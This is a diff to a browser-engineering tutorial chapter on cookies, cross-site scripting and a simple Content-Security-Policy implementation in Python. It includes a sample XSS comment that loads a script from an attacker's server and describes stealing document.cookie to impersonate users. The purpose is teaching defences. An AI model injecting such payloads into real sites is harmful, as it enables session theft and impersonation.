@@ -345,11 +345,8 @@ JS files). Because we handle cookies inside `request`, this should
 automatically work correctly, with later requests transmitting cookies
 set by previous responses.
 
-Cookies are alos accessible from JavaScript via the `document.cookie`
-field. This field is a string, containing the same contents as the
-`Cookie` header value. We can implement that in our browser pretty
-simply. First, we register `cookie` to a simple function that returns
-the cookie value:
+Cookies are also accessible from JavaScript's `document.cookie` value.
+To implement this, register a `cookie` function:
 
 ``` {.python}
 class JSContext:
@@ -363,7 +360,7 @@ class JSContext:
         return COOKIE_JAR.get(host, "")
 ```
 
-Then we expose this in `runtime.js`:
+Then create the `document.cookie` field in `runtime.js`:
 
 ``` {.javascript}
 Object.defineProperty(document, 'cookie', {
@@ -373,11 +370,13 @@ Object.defineProperty(document, 'cookie', {
 
 Now that our browser supports cookies and uses them for logins, we
 need to make sure cookie data is safe from malicious actors. After
-all: if someone stole your `token` cookie, they could set their own
-browser's cookie to the same value, and then the server would think
-they are you and give them all the same permissions. Our browser
-already prevents *other servers* from seeing your cookie values,
-because it stores cookies per-host.[^11][^12][^13][^14]
+all: if someone stole your `token` cookie, they could copy it into
+their browser, and the server would think they are you.
+
+Our browser already prevents *other servers* from seeing your cookie
+values, because it stores cookies per-host.[^11][^12][^13][^14] But
+attackers might be able to get *your server* or *your browser* to help
+them steal cookie values...
 
 [^11]: Well... Our connection isn't encrypted, so an attacker could
     pick up the token from there. But another *server* couldn't.
@@ -391,9 +390,6 @@ because it stores cookies per-host.[^11][^12][^13][^14]
     the wrong physical computer.
 
 [^14]: Security is very hard.
-
-But attackers might be able to get *your server* or *your browser* to
-help steal your cookie values...
 
 
 
@@ -412,42 +408,43 @@ out += "<p>" + entry + " <i>by " + who + "</i></p>"
 ```
 
 Note that `entry` can be anything, anything the user might stick into
-our comment form: even include a user-written `<script>` tag! Let's
-imagine that you're logged in as one user, maybe `crashoverride`, but
-would like to gain access to another username, maybe `nameless`. You
-could post the comment:
+our comment form. That includes HTML tags, like a custom `<script>`
+tag! So, a malicious user could post the comment:
 
     Hi! <script src="http://my-server/evil.js"></script>
 
-Our server would then output the HTML:
+The server would then output the HTML:
 
     <p>Hi! <script src="http://my-server/evil.js"></script>
     <i> by crashoverride</i></p>
 
-Our browser would then download and run the `evil.js` script. Then
-`evil.js` could access `document.cookie` and do something evil, like
-sending it to an attacker who could then impersonate you. In a real
-browser, `evil.js` might use [`fetch`][mdn-fetch] to secretly send that cookie to
-the attacker's server, but more complicated attacks work in our
-limited browser as well.[^no-fetch]
+Every user's browser would then download and run the `evil.js` script,
+which might read `document.cookie` and send[^how-send] it to the
+attacker. The attacker could then impersonate other users, posting as
+them or misusing any other capabilities those users had in our
+service.
+
+[^how-send]: In a real browser, `evil.js` might use
+    [`fetch`][mdn-fetch] to secretly send that cookie to the
+    attacker's server, but more complicated attacks work in our
+    limited browser as well. For example, the evil script can replace
+    the whole page with a link that goes to their site and includes
+    the token value in the URL. You've seen "please click to continue"
+    screens and have clicked the button unthinkingly; your users will
+    too.
 
 [mdn-fetch]: https://developer.mozilla.org/en-US/docs/Web/API/fetch
 
-[^no-fetch]: For example, the evil script can replace the whole page
-    with a link that goes to their site and includes the token value
-    in the URL. You've seen "please click to continue" screens and
-    have clicked the button unthinkingly; your users will too.
+The core problem here is that user comments are supposed to be data,
+but the browser is interpreting them as code. This kind of exploit is
+usually called *cross-site scripting* (often written "XSS"), though
+misinterpreting data as code is a common security issue in all kinds
+of programs.
 
-The core problem behind these problems is that user comments are
-supposed to be data, but the browser is interpreting them as code.
-This kind of exploit is usually called *cross-site scripting* (often
-written "XSS"), and the data-misinterpreted-as-code issue is a common
-security issue in all sorts of domains.
-
-The usual fix is to use a special encoding to avoid interpreting data
-as code. For example, in HTML, `&lt;` is supposed to be interpreted by
-the browser as a textual less-than sign.[^ch1-ex] Python's `html`
-module can do this kind of encoding:
+The standard fix is to encode the data so that it can't be interpreted
+as code. For example, in HTML, you can write `&lt;` to display a
+less-than sign.[^ch1-ex] Python has an `html` module for this kind of
+encoding:
 
 [^ch1-ex]: You may have implemented this as part of an [exercise in
     Chapter 1](http.md#exercises).
@@ -466,22 +463,28 @@ This is a good fix, and you should do it. But if you forget to encode
 any text anywhere---that's a security bug. So browsers provide
 additional layers of defense.
 
+Content security policy
+=======================
+
 One such layer is the `Content-Security-Policy` header. The full
 specification for this header is quite complex, but in the simplest
 case, the header is set to the keyword `default-src` followed by a
 space-separated list of servers:
 
-    Content-Security-Policy: default-src http://example.org http://www.example.org
+    Content-Security-Policy: default-src http://example.org
 
-When the `Content-Security-Policy` header is provided, the browser
-should refuse to load any resources for that page (CSS, JavaScript,
-images, and so on) except from the listed servers. If our guest book
-used `Content-Security-Policy`, even if a cross-site scripting attack
-succeeded, the browser would refuse to load and run the attacker's
-script.
+This header asks the browser not to load any resources (including CSS,
+JavaScript, images, and so on) except from the listed servers. If our
+guest book used `Content-Security-Policy`, even an attacker managed to
+get a `<script>` added to the page, the browser would refuse to load
+and run that script.
 
 Let's implement support for this header. First, we'll need to extract
-and parse the `Content-Security-Policy` header:
+and parse the `Content-Security-Policy` header:[^more-complex]
+
+[^more-complex]: In reality `Content-Security-Policy` can also list
+    scheme-generic URLs and even more complex sources like `'self'`.
+    This is a very limited CSP implementation.
 
 ``` {.python}
 class Tab:
@@ -491,21 +494,12 @@ class Tab:
         if "content-security-policy" in headers:
             csp = headers["content-security-policy"].split()
             if len(csp) > 0 and csp[0] == "default-src":
-                self.allowed_servers = csp[1:] + "/"
+                self.allowed_servers = csp[1:]
         # ...
 ```
 
-Note that I'm adding a slash to the end of the server name in the
-header, so that I can test if a url is allowed using
-`startswith`.[^more-complex]
-
-[^more-complex]: In reality `Content-Security-Policy` can also list
-    scheme-generic URLs and even more complex sources like `'self'`.
-    This is a very limited CSP implementation.
-
 This parsing needs to happen _before_ we request any JavaScript or
-CSS, because before we request those things, we need to check whether
-the request is allowed:
+CSS, because we now need to check whether those requests are allowed:
 
 ``` {.python}
 class Tab:
@@ -519,26 +513,20 @@ class Tab:
             # ...
 ```
 
-We first resolve the script's relative URL to an absolute URL. Then we
-check to see if it starts with any of the allowed servers, and if not,
-we skip that script. Do the same for CSS files.
-
-The `allowed_request` logic is a little tricky: it needs to handle both
-the case of no `Content-Security-Policy` and the case where there is
-one:
+Note that we need to first resolve any relative URLs before checking
+them against the list of allowed servers. The `allowed_request` check
+needs to handle both the case of no `Content-Security-Policy` and the
+case where there is one:
 
 ``` {.python}
 class Tab:
     def allowed_request(self, url):
         if self.allowed_servers == None: return True
-        for server in allowed_servers:
-            if url.startswith(server):
-                return True
-        return False
+        scheme_colon, _, host, _ = url.split("/", 3)
+        return scheme_colon + "//" + host in self.allowed_servers
 ```
 
-To test that this works, we can first make our server send a
-`Content-Security-Policy` header:
+The guest book can now send a `Content-Security-Policy` header:
 
 ``` {.python file=server}
 def handle_connection(conx):
@@ -547,8 +535,8 @@ def handle_connection(conx):
     # ...
 ```
 
-For testing, let's next modify the web pages the server to generate a
-request a script from somewhere else:
+To check that our implementation works, let's have the guest book
+request a script from outside the list of allowed servers:
 
 ``` {.python file=server}
 def show_comments(session):
